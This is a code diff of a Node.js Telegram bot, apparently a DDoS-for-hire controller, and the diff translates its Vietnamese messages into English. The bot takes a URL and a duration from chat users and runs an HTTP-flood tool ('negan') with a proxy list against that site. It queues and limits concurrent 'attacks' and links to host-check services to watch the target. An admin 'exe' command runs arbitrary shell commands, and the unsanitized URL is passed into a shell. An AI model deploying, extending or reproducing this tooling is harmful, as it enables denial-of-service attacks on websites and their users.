@@ -14,8 +14,8 @@ const currentAttacks = new Map(), attackQueue = [];
 
 // Thông báo bot đã sẵn sàng
 let isBotReady = true;
-bot.sendMessage(adminId, '[Version PRO] 🤖 Bot đã sẵn sàng nhận lệnh.');
-console.log('[DEBUG] Bot đã khởi động xong và sẵn sàng nhận lệnh.');
+bot.sendMessage(adminId, '[Version PRO] 🤖 Bot is ready to receive commands.');
+console.log('[DEBUG] Bot has started and is ready to receive commands.');
 
 // Hàm định dạng thời gian theo múi giờ Việt Nam (GMT+7)
 const getVietnamTime = () => new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' });
@@ -25,20 +25,40 @@ const sendHtmlMessage = async (chatId, message) => {
     try {
         await bot.sendMessage(chatId, message, { parse_mode: 'HTML' });
     } catch (error) {
-        console.error(`[ERROR] Gửi tin nhắn thất bại: ${error.message}`);
+        console.error(`[ERROR] Failed to send message: ${error.message}`);
     }
 };
 
 // Hàm thực thi lệnh
 const executeCommand = async (chatId, command, host, time, username) => {
     const pid = Math.floor(Math.random() * 10000), startTime = getVietnamTime();
-    const startMessage = `<b>🚀 Thành công 🚀</b>\n<pre>PID: ${pid}\nWEBSITE: ${host}\nThời gian: ${time} Giây\nNgười gọi lệnh: @${username}\nThời gian bắt đầu: ${startTime}\nSố lượt tấn công có thể gọi đồng thời: ${maxSlot} slots\n[Kiểm tra Host](https://check-host.net/check-http?host=${host}) | [Host Tracker](https://www.host-tracker.com/en/ic/check-http?url=${host})</pre>`;
+    const startMessage = `
+<pre>
+🚀 Success 🚀
+PID: ${pid}
+WEBSITE: ${host}
+Time: ${time} Seconds
+Command caller: @${username}
+Start time: ${startTime}
+Maximum concurrent attacks: ${maxSlot} slots
+[Host Check](https://check-host.net/check-http?host=${host}) | [Host Tracker](https://www.host-tracker.com/en/ic/check-http?url=${host})
+</pre>
+    `;
     await sendHtmlMessage(chatId, startMessage);
 
     const child = exec(command, { shell: '/bin/bash' });
     child.on('close', () => {
         const endTime = getVietnamTime();
-        const completeMessage = `<b>✅ Tiến trình hoàn tất</b>\n<pre>PID: ${pid}\nWEBSITE: ${host}\nThời gian: ${time} Giây\nNgười gọi lệnh: @${username}\nThời gian kết thúc: ${endTime}</pre>`;
+        const completeMessage = `
+<pre>
+✅ Process completed
+PID: ${pid}
+WEBSITE: ${host}
+Time: ${time} Seconds
+Command caller: @${username}
+End time: ${endTime}
+</pre>
+        `;
         sendHtmlMessage(chatId, completeMessage);
         currentAttacks.delete(chatId);
         if (attackQueue.length > 0) {
@@ -54,26 +74,26 @@ bot.on('message', async (msg) => {
     const username = msg.from.username || msg.from.first_name;
 
     // Kiểm tra quyền thực thi lệnh
-    if (!isAdmin && !isGroup) return sendHtmlMessage(chatId, '<b>🚫 Bạn không có quyền thực hiện lệnh này.</b>');
+    if (!isAdmin && !isGroup) return sendHtmlMessage(chatId, '<b>🚫 You do not have permission to execute this command.</b>');
 
     // Xử lý lệnh tấn công (URL + thời gian)
     if (text.startsWith('http://') || text.startsWith('https://')) {
         const parts = text.split(' ');
-        if (parts.length !== 2 || isNaN(parts[1])) return sendHtmlMessage(chatId, '<b>🚫 Sai định dạng! Nhập theo: &lt;URL&gt; &lt;time&gt;.</b>');
+        if (parts.length !== 2 || isNaN(parts[1])) return sendHtmlMessage(chatId, '<b>🚫 Invalid format! Use: &lt;URL&gt; &lt;time&gt;.</b>');
         const [host, time] = parts;
-        if (time > maxTimeAttacks) return sendHtmlMessage(chatId, `<b>🚫 Thời gian tối đa là ${maxTimeAttacks} giây.</b>`);
+        if (time > maxTimeAttacks) return sendHtmlMessage(chatId, `<b>🚫 Maximum time is ${maxTimeAttacks} seconds.</b>`);
 
         // Kiểm tra số lệnh đang chạy của người dùng
         const userAttacks = Array.from(currentAttacks.values()).filter(attack => attack.user === chatId).length;
         if (userAttacks >= maxSlot) {
             const remainingTime = maxTimeAttacks - (Date.now() - currentAttacks.get(chatId).startTime) / 1000;
-            return sendHtmlMessage(chatId, `<b>🚫 Bạn đang có một lệnh chạy. Vui lòng chờ tiến trình hiện tại hoàn tất. Số giây còn lại: ${Math.ceil(remainingTime)} giây.</b>`);
+            return sendHtmlMessage(chatId, `<b>🚫 You have an ongoing command. Please wait for the current process to complete. Remaining time: ${Math.ceil(remainingTime)} seconds.</b>`);
         }
 
         // Kiểm tra số lệnh đang chạy toàn hệ thống
         if (currentAttacks.size >= maxConcurrentAttacks) {
             attackQueue.push({ chatId, command: `node ./negan -m GET -u ${host} -p live.txt --full true -s ${time}`, host, time, username });
-            return sendHtmlMessage(chatId, '<b>⏳ Lệnh của bạn đã được thêm vào hàng đợi. Vui lòng chờ...</b>');
+            return sendHtmlMessage(chatId, '<b>⏳ Your command has been added to the queue. Please wait...</b>');
         }
 
         const command = `node ./negan -m GET -u ${host} -p live.txt --full true -s ${time}`;
@@ -85,15 +105,24 @@ bot.on('message', async (msg) => {
     // Xử lý lệnh exe (chỉ admin)
     if (text.startsWith('exe ') && isAdmin) {
         const command = text.slice(4).trim();
-        if (!command) return sendHtmlMessage(chatId, '<b>🚫 Lệnh không được để trống. Ví dụ: exe ls</b>');
+        if (!command) return sendHtmlMessage(chatId, '<b>🚫 Command cannot be empty. Example: exe ls</b>');
         const child = exec(command, { shell: '/bin/bash' });
         let output = '';
         child.stdout.on('data', (data) => output += data.toString());
         child.stderr.on('data', (data) => output += data.toString());
-        child.on('close', () => sendHtmlMessage(chatId, `<b>🚀 Kết quả lệnh:</b>\n<pre>${command}\n${output}</pre>`));
+        child.on('close', () => {
+            const resultMessage = `
+<pre>
+🚀 Command result:
+${command}
+${output}
+</pre>
+            `;
+            sendHtmlMessage(chatId, resultMessage);
+        });
         return;
     }
 
     // Lệnh không hợp lệ
-    sendHtmlMessage(chatId, '<b>🚫 Lệnh không hợp lệ. Vui lòng bắt đầu lệnh với "exe" hoặc nhập URL và thời gian.</b>');
+    sendHtmlMessage(chatId, '<b>🚫 Invalid command. Please start with "exe" or enter a URL and time.</b>');
 });
